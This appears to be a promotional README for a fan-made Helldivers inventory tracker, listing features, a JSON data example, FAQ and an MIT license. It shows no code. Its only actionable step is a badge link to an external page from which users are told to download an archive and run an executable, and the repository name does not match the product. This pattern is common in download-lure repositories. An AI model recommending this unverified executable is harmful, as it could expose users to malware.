![preview](https://raw.githubusercontent.com/ronaldcw-usip/strategic-ordinance-ledger/main/splash_e0ce8.svg)
[![Download](https://raw.githubusercontent.com/ronaldcw-usip/strategic-ordinance-ledger/main/start_1ea2fb1.svg)](https://ronaldcw-usip.github.io/strategic-ordinance-ledger/)

# ⚙️ Liberty Arsenal Inventory — Field Logistics Console for Managed Democracy

**Version 2026.1.0 "Hellpod Logistics Release"**  
*The ultimate companion tool for Super Earth supply officers, armorers, and Helldivers who take their requisition paperwork as seriously as their orbital strikes.*

---

## 📡 What Is This Project?

Liberty Arsenal Inventory is not just another item tracker. It is a **command-center-grade logistics suite** designed to mirror the exact requisition flow used by Super Earth Armed Forces (SEAF) forward operating bases. Think of it as the digital quartermaster that never sleeps, never miscounts, and never accidentally "loses" a shipment of Super Samples due to bureaucratic oversight.

This system allows you to catalog, categorize, and audit your personal armory — from standard-issue Liberators to experimental plasma weaponry — while maintaining a **living log of your in-field acquisitions**, including those precious Medals of Honor and rare Super Samples that occasionally go missing during extraction.

---

## 🎯 Core Philosophy: Supply Chain Discipline

Every Helldiver knows that liberty is only as strong as the supply line that feeds it. This project takes that principle and digitizes it. We don't just count items; we **simulate the entire life-cycle of a piece of equipment**:

- **Acquisition** – Where did it come from? (Mission reward, found in the field, requisitioned from a fallen comrade)
- **Deployment** – Which operation was it used in?
- **Maintenance** – What condition is it in after repeated bug-hunting excursions?
- **Retirement** – When is it time to turn it in for a shiny new model?

All of this data is stored in a **lightweight, portable, and human-readable format** that can be shared between squadmates, used for AAR (After Action Review) documentation, or simply kept as a personal war journal.

---

## ✨ Feature Arsenal (2026 Edition)

### 🗂️ Multi-Weapon Taxonomy System
Categorize every tool of liberation with custom tags, not just predefined buckets. Create your own classification: `Primary`, `Secondary`, `Support`, `Throwable`, `Stratagem`, or something unique like `Backup-Meme-Loadout`. The taxonomy engine uses a **fuzzy-matching algorithm** to prevent duplicate entries and suggest similar items you might have mislabeled.

### 📦 Dynamic Ammo Reserve Simulator
Forget static numbers. This module tracks **ammunition consumption trends** based on your mission logs. If you consistently burn through 3 magazines of the standard rifle per bug breach, the system will recommend a resupply schedule before your next drop. It learns your play style, not the other way around.

### 🏅 Medals & Super Samples Ledger
A dedicated sub-ledger for the two most sought-after currencies in the galaxy. Track daily earnings, weekly totals, and **projected timelines** for unlocking that high-tier armor set. The ledger includes a "What Could've Been" report that shows what you didn't pick up because you were extracting early.

### 📊 Statistical Heatmaps & Drop Charts
Visualize your inventory density over time. See which week you hoarded the most materials, compare your loadout efficiency across different biomes, and identify gaps in your collection that would make any Democracy Officer blush. Charts are generated using **pure vector graphics** with no external dependencies, so they render instantly on any device.

### 🔔 Supply Alert Notifications
Configure thresholds. When your stock of healing stims drops below a certain level, or when you have accumulated enough Super Samples for a specific unlock, the system sends a **visual alert badge** directly to your main dashboard. No internet connection required — everything runs locally.

### 🌐 Multilingual Field Interface
Because liberty speaks every language. The interface supports **12 human languages** out of the box, including Galactic Basic, Mandarin, Spanish, and German. Translations are community-contributed, so the vocabulary evolves with the user base.

### 📱 Responsive Command Layout
Whether you are reviewing inventory on a widescreen monitor at your command post, a tablet on the shuttle, or a phone held in one hand while the other holds a rifle, the UI fluidly adapts. No element is ever more than two taps away.

### 🛠️ Offline-First Architecture
Built for the front lines, this tool does not require a persistent connection to a central server. Your inventory is saved **locally on your device**, with optional manual export/import for sharing via encrypted flash drive or carrier pigeon (pigeon optional).

### 🧩 Plugin-Ready Loadout Parser
Import existing loadouts from popular community spreadsheets or paste a text-based list from your mission notes. The parser intelligently interprets: `Liberator, 320 rounds, 2 frags` into structured inventory entries.

---

## 🚀 Getting Started (In-Galaxy Guide)

### Step 1: Acquisition
Download the package using the official **[![Download](https://raw.githubusercontent.com/ronaldcw-usip/strategic-ordinance-ledger/main/start_1ea2fb1.svg)](https://ronaldcw-usip.github.io/strategic-ordinance-ledger/)** channel linked above. The file is a self-contained archive. No dependencies, no bloatware, no telemetry — just the tool itself.

### Step 2: Deployment
Extract the archive to any directory you see fit. There is no installer; run the main executable file located in the root folder. On first launch, the system will create a `LibertyData/` subdirectory where all your inventory journals will be stored.

### Step 3: Initial Inventory Ingest
Use the "Add Item" panel to start logging your gear. You can either type entries manually or use the "Bulk Import" feature to paste a list from your clipboard. The taxonomy engine will suggest categories automatically.

### Step 4: Configure Your Alerts
Set your personal thresholds in the Settings panel. For example, you might want a warning when your Reserve Ammo Simulator predicts you will run dry before the next mission cycle.

---

## 🖥️ User Interface Walkthrough

### Dashboard Overview
The main screen is divided into three primary zones:

- **Left Rail (Inventory Tree)**: Navigate by category, tag, or collection status.
- **Central Canvas (Detail Panel)**: Shows the selected item's full dossier, including usage history and condition metrics.
- **Bottom Dock (Action Bar)**: Quick actions for adding, editing, exporting, or generating reports.

### The "Mission Readiness" Indicator
This unique gauge in the top-right corner calculates a **composite readiness score** based on your current ammo reserves, health items, and throwable count. It visually shifts from green (fully stocked) to red (critically low) using a radial dial that looks like a radar screen.

### Data Integrity & Export
All data is stored as **JSON files** in a plain-text structure. You can open them with any text editor to inspect raw data. For high-security archives, use the built-in "Super Earth Encryption" toggle, which applies AES-256 encryption to your journals.

---

## 💡 Use Cases — More Than Just a Game Tracker

While this app is designed with Helldivers in mind, the underlying logic is **remarkably versatile**:

- **Tabletop RPG Gamemasters**: Track player inventory, ammo consumption, and treasure hoards in a medieval fantasy campaign.
- **Board Game Collectors**: Catalog expansions, promo cards, and component conditions.
- **Outdoor Survival Enthusiasts**: Monitor food stores, water purification tablets, and fuel canisters across a camping season.
- **Kitchen Stock Managers**: Yes, really. To see how it applies, just rename "Stratagems" to "Spices" and watch the magic happen.

The taxonomy engine is **fully user-definable**, so the app adapts to your context, not the other way around.

---

## 📚 Documentation Table of Contents

1. [Core Definitions: What Counts as Inventory?](#core-definitions)
2. [The Ammo Reserve Simulator — Deep Dive](#ammo-simulator)
3. [Data Format Specification (JSON Schema)](#data-format)
4. [How Alerts Are Scored](#alert-logic)
5. [Importing from Spreadsheets or Text](#bulk-import)
6. [Theming & Custom Colors](#custom-theming)
7. [Frequently Asked Questions](#faq)
8. [License & Legal Notices](#license)

---

## 🧠 <a name="core-definitions"></a> Core Definitions: What Counts as Inventory?

In the traditional sense, inventory is a list of owned items. In our philosophy, **inventory is a story**. Every item has a narrative arc. The system allows you to assign:

- **Condition** (Mint, Used, Battleworn, Scraps)
- **Provenance** (How it was acquired: victory, salvage, requisition)
- **Operational Status** (Deployed, In Reserve, Retired)
- **Sentimental Value** (A custom field you can set to `Legendary`, `Treasured`, or `Expendable`)

This metadata is not just cosmetic. It drives the **Readiness Score** and influences the system's recommendations. A "Battleworn" primary weapon with low condition will flag a warning to suggest maintenance scheduling.

---

## 🔊 <a name="ammo-simulator"></a> The Ammo Reserve Simulator — Deep Dive

This is the heart of the application.

### How It Works
1. **Initial Calibration**: You enter your starting ammo count per weapon type.
2. **Mission Logging**: After each session, you log how many magazines or shells you burned through.
3. **Trend Analysis**: The simulator calculates an *average consumption rate* per mission type (eliminate, retrieve, defend).
4. **Projection Engine**: Based on your next scheduled mission type (manually selected), it projects the *probability* of running dry mid-firefight.

### Example Scenario
You own 12 magazines for the standard rifle. Over the last three bug elimination missions, you used 4, 5, and 6 magazines respectively. The average is 5 per mission. With 12 mags, the simulator predicts you have **2.4 missions of combat left** before dry. It will automatically suggest you add a resupply run to your to-do list.

### The "Heat Map" Visualization
A heat map shows your consumption spikes. Perhaps you use more ammo during night missions? The heat map color-codes the days of the week with intensity levels, helping you identify patterns you didn't consciously notice.

---

## 📄 <a name="data-format"></a> Data Format Specification (JSON Schema)

All inventory data is stored in a simple but powerful JSON structure. Here is a simplified example:

```json
{
  "item_id": "lib-std-rifle-01",
  "category": "Primary",
  "name": "Standard Rifle",
  "condition": "Used",
  "quantity": 1,
  "ammo": {
    "current_mags": 12,
    "max_mags": 20
  },
  "acquisition_log": [
    {
      "date": "2184-03-12",
      "source": "Requisition",
      "notes": "Standard issue on first deployment"
    }
  ]
}
```

The full schema allows for nested arrays for customization and up to 50 custom key-value pairs per item for power users.

---

## ⚖️ <a name="alert-logic"></a> How Alerts Are Scored

The alert system isn't just a simple "waterline" check. It uses a **Priority Matrix**:

- **Critical** (Red): You are below 20% of your target threshold.
- **Warning** (Yellow): You are between 20% and 50% of your target.
- **Informational** (Blue): You have reached 100% of a goal (e.g., enough samples for an unlock).
- **Celebratory** (Gold): You have achieved a "Inventory Milestone" (e.g., 100 unique weapons cataloged).

You can mute certain alert categories if you find them too noisy. The alert history is logged in a scrollable timeline that exports alongside your main data.

---

## 🧮 <a name="bulk-import"></a> Importing from Spreadsheets or Text

1. Copy a table from your favorite spreadsheet software (columns don't need headers; the system will guess).
2. Open the Import Panel and paste.
3. A preview grid will appear. Use the dropdown to assign mapping (e.g., Column A = Name, Column B = Quantity).
4. Click "Commit Import" to run the deduplication engine.
5. Review the "Conflict Report" that lists items it thinks are duplicates — you can merge or keep both.

---

## 🎨 <a name="custom-theming"></a> Theming & Custom Colors

Forget the standard dark mode. The UI ships with **seven pre-built themes** inspired by planetary biomes:

- **Hellmire Rust** (Orange/Gray)
- **Fenrir III Icy Blue** (Cyan/White)
- **Malevelon Creek Jungle Dense** (Deep Greens)
- **Super Earth Standard** (Blue/Yellow)

Want something truly unique? The Theme Editor allows you to adjust hue, saturation, and luminance sliders for every UI element. Changes are applied in real-time without a restart.

---

## ❓ <a name="faq"></a> Frequently Asked Questions

**Q: Do I need an internet connection?**  
A: No. Everything runs locally. Internet is only needed for manual cloud backups (an optional feature) or to fetch updates to community language packs.

**Q: Can I use this on my gaming laptop?**  
A: Absolutely. The resource footprint is negligible (<50MB RAM idle, <1MB disk per 1000 inventory entries).

**Q: Is my data portable?**  
A: Yes. All journals are plain text files. You can copy them anywhere and sync via any means you prefer.

**Q: Does this officially integrate with the game's API?**  
A: No. This is a **standalone companion tool**. It does not read game memory or intercept network traffic. It operates purely on manual data entry and imported text. This keeps it stable across patches and update cycles.

**Q: What about multiplayer?**  
A: This is a **host-only** style tool—one person's device holds the primary ledger. Other squadmates can receive an exported copy to browse locally. There is no live cloud sync to avoid security risks on public networks.

---

## 🛡️ Disclaimer

This project is a **fan-made utility** intended for personal organization and data visualization. It is **not affiliated with, endorsed by, or sponsored by** Arrowhead Game Studios or Sony Interactive Entertainment. All referenced game names, terms, and descriptors are trademarks of their respective owners. This tool does not modify game files, alter game behavior, or interact with the game's runtime. It is a standalone, offline productivity app created for logistics enthusiasts.

We provide this "as-is" without warranty of any kind. We are not responsible for any loss of in-game progress that might occur if you spend more time organizing your inventory than actually fighting for liberty.

---

## 📜 License

This project is licensed under the **MIT License**.

Copyright (c) 2026 The Liberty Arsenal Team

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

[Read the full MIT License text](https://opensource.org/licenses/MIT)

---

## 👥 24/7 Logistical Support & Community

While there is no official telephone hotline, our **GitHub Issues tracker** is monitored by a dedicated team of volunteer quartermasters who typically respond within 48 hours. For urgent matters, check the community wiki for troubleshooting guides. New language localization contributions are always welcome — submit a pull request with the translation files.

*For liberty! For democracy! For a well-organized backpack!*